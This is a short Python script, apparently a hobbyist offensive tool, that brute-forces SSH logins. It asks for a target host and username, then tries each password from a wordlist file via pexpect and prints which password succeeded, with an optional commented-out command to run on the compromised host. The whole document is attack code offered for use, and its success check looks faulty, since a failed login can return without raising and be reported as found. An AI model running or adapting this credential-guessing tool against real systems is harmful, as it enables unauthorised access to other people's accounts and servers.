#! /usr/bin/python

import pexpect
from threading import *
from termcolor import colored

PROMPT = ["# ", ">>> ", "> ", "\$"]

def send_command(child, command):
	child.sendline(command)
	child.expect(PROMPT)
	print(child.before.decode("UTF-8"))
	child.close()


def connect(user, host, password):
	ssh_newkey = "Are you sure you want to continue connecting"
	connStr = "ssh " + user + "@" + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, "[P|p]assword: "])
	if ret == 0:
		print("[-] Error Connecting")
		return
	elif ret == 1:
		child.sendline("yes")
		ret = child.expect([pexpect.TIMEOUT, "[P|p]assword: "])
		if ret == 0:
			print("[-] Error Connecting")
			return
	child.sendline(password)
	ret = child.expect(PROMPT, timeout=0.5)
	return child


def main():
	host = input("Enter bruteforce target host: ")
	user = input("Enter login: ")
	filename = "passwords.txt"

	f = open(filename)
	for password in f.readlines():
		password = password.strip("\n")
		try:
			child = connect(user, host, password)
			print(colored("[+] Password found: %s" % password, "green"))
			# send_command(child, "whoami") # Send a command (optional)

		except Exception as e:
			print(colored("[-] Password incorrect: %s" % password, "red"))
	f.close()

if __name__ == "__main__":
	main()
